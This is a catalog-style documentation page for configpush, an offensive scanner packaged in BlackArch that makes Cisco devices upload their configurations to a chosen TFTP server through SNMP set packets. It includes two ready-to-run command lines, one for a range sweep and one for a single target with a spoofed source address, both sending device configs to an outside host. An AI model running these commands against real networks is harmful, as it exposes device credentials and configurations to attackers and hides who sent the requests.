---
name: "configpush"
categories:
  - blackarch-scanner
version: "0.8.5"
homepage: "http://packetstormsecurity.com/files/126621/Config-Push-snmpset-Utility.html"
packaged-by: [blackarch]
blackarch-builddate: "2018-11-15"
build-system: other
license: custom:unknown
meta-checked: "2026-11-09"
worth: 0.4
worth-basis: "adoption-only (no upstream data)"
worth-checked: "2026-11-09"
---

# configpush

> Mass-snmpset tool that tells Cisco devices across huge ranges to copy their configuration to your TFTP server.

## What it's for

configpush (v0.8.5, M. Killebrew / net7 systems — built around the "RTFM vulnerability": securely coded devices with insecure configurations) crafts raw SNMP set packets instructing Cisco devices to push their configuration to a TFTP server of your choosing. It sweeps CIDR ranges up to /8 scale at a bandwidth limit you set, so any device still carrying the default — or otherwise specified — community string accepts the set and uploads its config, turning a writable community string into full configuration disclosure. Source addresses can be spoofed per run (fixed address, or derived from each target), and the packet rate is throttled with a Mbit/s cap. Config retrieval depends on a TFTP server at the destination actually catching the uploads.

No corpus evidence — derived from the upstream source.

## Typical use cases

### Sweep a range for config archives

Blind-copy configurations from a subnet.

```
configpush -i eth0 -r 198.51.100.0/24 -f 198.51.100.50 -c private -m 5
```

Outcome: raw SNMP set packets go out on eth0 to every address in the range using community "private", instructing each device to TFTP its configuration to 198.51.100.50, throttled to 5 Mbit/s; any device honoring the community string uploads its config to that TFTP server.

### Target one device with a spoofed source

Push the snmpset to a single router while hiding the real sender.

```
configpush -i eth0 -t 198.51.100.10 -f 198.51.100.50 -s 198.51.100.99 -c private
```

Outcome: only 198.51.100.10 receives the request, with packets carrying the spoofed source 198.51.100.99; the config upload lands on the TFTP destination. Use `-S` instead of `-s` to spoof each source from the target's own address.
